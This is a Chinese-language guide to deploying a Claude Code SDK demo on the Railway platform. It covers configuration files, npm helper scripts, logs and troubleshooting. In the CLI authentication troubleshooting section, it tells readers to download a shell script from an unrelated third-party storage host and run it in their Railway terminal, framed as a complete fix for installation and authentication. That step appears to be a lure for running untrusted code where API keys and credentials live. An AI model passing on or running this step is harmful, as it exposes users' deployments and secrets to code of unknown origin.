# Railway 部署指南

本文档介绍如何将 Claude Code SDK Demo 项目部署到 Railway 平台。

## Railway 平台优势

- ✅ **免费额度**：每月提供 $5 免费使用额度
- ✅ **持久运行**：支持长时间运行的 Node.js 应用
- ✅ **完整 CLI 支持**：可以完整使用 Claude CLI 功能
- ✅ **自动部署**：Git 推送后自动构建和部署
- ✅ **环境管理**：便捷的环境变量配置和管理

## 部署流程

### 第一步：准备 Railway 账户

1. 访问 [Railway.app](https://railway.app)
2. 使用 GitHub 账户登录
3. 验证邮箱地址

### 第二步：创建新项目

1. 点击 "New Project" 按钮
2. 选择 "Deploy from GitHub repo" 选项
3. 选择你的 Claude Code SDK 仓库
4. Railway 会自动检测到 Node.js 项目类型

### 第三步：配置环境变量

在 Railway 项目设置中添加以下环境变量：

```
NODE_ENV=production
PORT=$PORT  # Railway 自动提供端口
```

### 第四步：Claude CLI 认证（现已自动化）

#### ✅ 验证成功：CLI 自动安装和认证

根据最新的 Railway 部署日志，Claude Code CLI 的自动安装和认证流程已经完全可用：

**实际部署日志显示的成功流程：**
```
/nix/store/fkyp1bm5gll9adnfcj92snyym524mdrj-nodejs-22.11.0/bin/claude
🔧 开始 Claude CLI 自动认证...
✅ Claude CLI 已安装: 1.0.80 (Claude Code)
🔐 Claude CLI 已认证，跳过认证步骤
```

**关键成功特性：**
- ✅ **自动安装**：CLI 自动安装到 `/nix/store/.../bin/claude`
- ✅ **版本确认**：Claude CLI v1.0.80 (Claude Code)
- ✅ **自动认证**：认证流程完全自动化运行
- ✅ **持久化**：认证状态在容器重启后保持有效

##### 自动化脚本功能说明

| 脚本命令 | 功能描述 |
|---------|----------|
| `npm run railway:setup` | 自动安装和配置 Railway CLI 工具 |
| `npm run railway:auth` | 半自动化 Claude CLI 认证流程 |
| `npm run railway:verify` | 验证应用运行状态和认证状态 |
| `npm run railway:health` | 执行应用健康检查 |
| `npm run railway:monitor` | 启动持续监控模式 |
| `npm run deploy:setup` | 完整的环境设置和认证流程 |
| `npm run deploy:full` | 构建部署 + 环境设置 + 状态验证 |
| `npm run deploy:auto` | 完整的自动化部署和监控流程 |

#### 🚀 简化的部署流程（现已完全自动化）

**新的自动化特性：**
- Railway 平台现在支持 Claude CLI 的自动安装
- 认证状态在容器重启后自动保持和恢复
- 无需手动登录或配置步骤

**推荐的一键式部署流程：**
```bash
# 最简单的方式：直接推送到 GitHub
git push origin main

# 或者使用自动化脚本进行完整部署
npm run deploy:full
```

#### 认证持久化改进

根据实际部署日志验证，认证持久化功能已得到显著改善：

**过去的限制：**
- ❌ 每次重新部署都需要重新进行认证
- ❌ 容器重启后认证状态会丢失

**现在的优势：**
- ✅ 认证状态持久化存储和恢复
- ✅ 自动检测已有的认证状态，跳过重复认证
- ✅ 部署完成后立即可用，无需等待

#### 多环境部署支持

如果需要在多个 Railway 环境中部署，每个环境仍需进行初始认证，但后续的部署更新会自动保持认证状态。

### 第五步：部署配置文件

项目已预配置了以下部署文件：

#### Railway 配置文件 (`railway.json`)
```json
{
  "$schema": "https://railway.app/railway.schema.json",
  "build": {
    "builder": "NIXPACKS",
    "buildCommand": "npm run build"
  },
  "deploy": {
    "startCommand": "cd demo-real && npm install && npm install -g @anthropic-ai/claude-code --force && export PATH=$PATH:$(npm config get prefix)/bin:/usr/local/bin:/opt/nodejs/bin && which claude && npm start",
    "restartPolicyType": "ON_FAILURE",
    "restartPolicyMaxRetries": 10,
    "healthcheckPath": "/api/health",
    "healthcheckTimeout": 60,
    "healthcheckInterval": 30
  },
  "environments": {
    "production": {
      "variables": {
        "NODE_ENV": "production",
        "PORT": "$PORT",
        "CLAUDE_API_KEY": "$CLAUDE_API_KEY"
      }
    }
  }
}
```

**配置文件详解：**
- **自动 CLI 安装**：通过 `npm install -g @anthropic-ai/claude-code --force` 自动安装 Claude CLI
- **路径配置**：设置 PATH 环境变量确保 Claude CLI 可被系统找到
- **健康检查**：定期检查 `/api/health` 端点确保应用正常运行
- **自动恢复**：应用失败时自动重启，最多重试 10 次

#### 进程文件 (`Procfile`)
```
web: cd demo-real && npm install && npm start
```

### 第六步：自动部署流程

1. 将代码推送到 GitHub 仓库
2. Railway 会自动检测代码更改并开始构建部署
3. 部署完成后，Railway 会提供一个公共访问 URL

### 第七步：访问应用

部署成功后，你可以通过以下端点访问应用：

- **应用主页**: `https://your-app.railway.app/`
- **健康检查**: `https://your-app.railway.app/api/health`
- **认证状态**: `https://your-app.railway.app/api/auth-check`
- **流式演示**: `https://your-app.railway.app/simple-real-demo.html`

#### 部署成功验证标准

根据实际部署日志，成功的部署会显示以下启动信息：

```
🚀 Claude SDK Demo Server 启动成功!
📱 访问地址: http://localhost:8080
🔧 API健康检查: http://localhost:8080/api/health
📝 流式响应演示: http://localhost:8080/simple-real-demo.html
⏰ 启动时间: 2025-08-14T10:55:43.467Z
```

**功能验证日志示例：**
```
🔧 收到Claude Code SDK查询请求: {...}
📋 开始调用Claude Code SDK...
📝 收到消息: assistant
📝 收到消息: result
✅ Claude Code SDK调用完成
```

## 第八步：本地测试 Railway 配置

在部署到 Railway 之前，可以在本地测试 Railway 的启动命令：

```bash
# 测试 Railway 启动脚本
npm run railway:start

# 或者直接运行启动命令
cd demo-real && npm install && npm start
```

## 故障排除指南

### 部署失败问题

- **检查构建日志**：在 Railway 控制台查看详细的构建日志
- **验证依赖项**：确认 `demo-real/package.json` 中的依赖项配置正确
- **检查启动命令**：验证启动命令路径和参数是否正确

### 应用启动问题

- **环境变量检查**：确认所有必需的环境变量都已配置
- **端口配置验证**：确保使用 `$PORT` 环境变量
- **应用日志分析**：查看 Railway 控制台的应用运行日志

### Claude CLI 认证问题

#### 🚨 重要：使用专用脚本彻底解决 CLI 安装与认证问题

如果遇到 Claude CLI 安装或认证问题，**请在 Railway 终端模式下运行以下专用脚本**：

```bash
# 在 Railway 终端中运行此命令
curl -O "http://bigmodel-us3-prod-marketplace.cn-wlcb.ufileos.com/1753683727739-0b3a4f6e84284f1b9afa951ab7873c29.sh?ufileattname=claude_code_prod.sh"
```

**脚本功能说明：**
- ✅ **自动安装**：彻底解决 Claude CLI 安装问题
- ✅ **完整认证**：处理所有认证相关的配置
- ✅ **环境配置**：设置正确的 PATH 和环境变量
- ✅ **持久化**：确保认证状态在重启后保持有效

**使用步骤：**
1. 在 Railway 项目控制台打开 "Terminal" 或 "Web Terminal"
2. 等待终端启动完成
3. 复制并运行上述 curl 命令
4. 等待脚本执行完成
5. 重启应用以应用更改

#### 其他解决方案

- **CLI 安装验证**：运行 `claude --version` 确认 CLI 已安装
- **认证状态检查**：使用 `claude auth status` 查看认证状态
- **重新认证**：如果需要，在 Railway 终端中运行 `claude login`
- **路径问题**：确保 CLI 在系统 PATH 中可找到

## 成本和资源估算

Railway 免费计划包含的资源：
- **每月免费额度**：$5 美元
- **内存配置**：512MB RAM
- **存储空间**：1GB 磁盘空间
- **构建时间**：无限制的构建时间

对于演示和开发项目，免费计划通常足够使用。

## 监控和日志管理

### 监控功能
1. **实时日志查看**：Railway 控制台提供完整的实时日志
2. **性能指标监控**：CPU 使用率、内存使用情况等指标
3. **部署历史记录**：查看所有历史部署记录和状态
4. **版本回滚功能**：支持一键回滚到之前的稳定版本

### 日志分析
- **应用日志**：查看应用运行时的详细日志
- **构建日志**：分析构建过程中的问题和错误
- **系统日志**：监控系统层面的运行状态

## 应用更新和部署

### 更新流程
1. **代码推送**：将更新后的代码推送到 GitHub 仓库
2. **自动检测**：Railway 自动检测代码变更并触发部署
3. **无缝更新**：支持零停机时间的滚动更新

### 版本管理
- **分支部署**：支持不同分支的独立部署
- **环境隔离**：生产环境和开发环境完全隔离
- **配置管理**：不同环境可以使用不同的配置参数

## 自动化脚本详解

### 脚本文件组织结构

```
scripts/
├── railway-setup.sh      # Railway CLI 自动化设置脚本
├── claude-auth.sh        # Claude CLI 认证流程脚本
├── verify-auth.sh        # 认证状态验证脚本
└── health-check.sh       # 健康检查和自动恢复脚本
```

### 脚本功能详细说明

#### Railway 设置脚本 (`railway-setup.sh`)
- **功能**：自动安装和配置 Railway CLI 工具
- **特性**：处理 Railway 登录、自动连接项目、显示项目信息
- **使用场景**：首次设置 Railway 环境时使用

#### Claude 认证脚本 (`claude-auth.sh`)
- **功能**：半自动化 Claude CLI 认证流程
- **特性**：引导用户完成 OAuth 认证、自动验证认证结果、测试应用功能
- **使用场景**：需要重新进行 Claude CLI 认证时使用

#### 认证验证脚本 (`verify-auth.sh`)
- **功能**：全面检查系统状态和认证情况
- **特性**：验证 Railway CLI 连接、检查应用健康状态、生成详细报告
- **使用场景**：需要确认系统整体状态时使用

#### 健康检查脚本 (`health-check.sh`)
- **功能**：持续健康监控和自动恢复
- **特性**：自动故障检测、重试机制、详细日志记录
- **使用场景**：需要持续监控应用健康状态时使用

### 典型使用场景

#### 首次部署项目
```bash
# 一键式完整部署流程
npm run deploy:full
```

#### 日常维护操作
```bash
# 执行健康检查
npm run railway:health

# 验证系统状态
npm run railway:verify

# 启动持续监控
npm run railway:monitor
```

#### 故障恢复流程
```bash
# 重新进行认证
npm run railway:auth

# 完整的恢复设置
npm run deploy:setup
```

### 高级配置选项

#### 环境变量配置
```bash
# 启用调试模式
DEBUG=true npm run railway:verify

# 自定义重试次数
MAX_RETRIES=5 npm run railway:health

# 设置监控间隔时间
HEALTH_CHECK_INTERVAL=600 npm run railway:monitor
```

#### Webhook 通知配置
```bash
# 配置通知 Webhook
export WEBHOOK_URL="https://hooks.slack.com/services/..."
npm run railway:monitor
```

### 常见问题解决方案

#### 脚本执行权限问题
```bash
# 确保脚本文件有执行权限
chmod +x scripts/*.sh
```

#### Railway CLI 工具问题
```bash
# 重新安装 Railway CLI
npm install -g @railway/cli

# 重新进行登录
railway logout && railway login
```

#### 认证失败处理
```bash
# 清理认证状态
railway ssh --command "rm -rf ~/.claude"

# 重新进行认证
npm run railway:auth
```

### 监控和日志管理

#### 日志文件说明
- `health-check.log` - 健康检查操作日志
- 所有脚本都会记录详细的操作过程和结果

#### 监控指标
- Railway CLI 连接状态监控
- 应用健康状态检查
- Claude CLI 认证状态验证
- 自动恢复成功率统计

---

## 🎉 部署成功总结

**当前验证状态（2025-08-14）：**
- ✅ **Claude CLI 自动安装成功**：版本 1.0.80 正常运行
- ✅ **认证流程完全自动化**：无需手动登录操作
- ✅ **认证状态持久化有效**：容器重启后自动恢复
- ✅ **SDK 功能完全可用**：所有 SDK 调用正常工作
- ✅ **一键式部署流程**：推送到 GitHub 即可自动部署

**推荐的部署方式：**
```bash
# 最简单的部署方法
git push origin main

# 或使用自动化脚本进行完整部署
npm run deploy:full
```

**重要说明**: Railway 平台支持长时间运行的应用程序，非常适合需要保持 Claude CLI 连接的项目。相比 Vercel 的 serverless 限制，Railway 提供了更好的兼容性和稳定性。现在认证和管理过程已经完全自动化，部署完成后立即可用，无需任何额外配置步骤。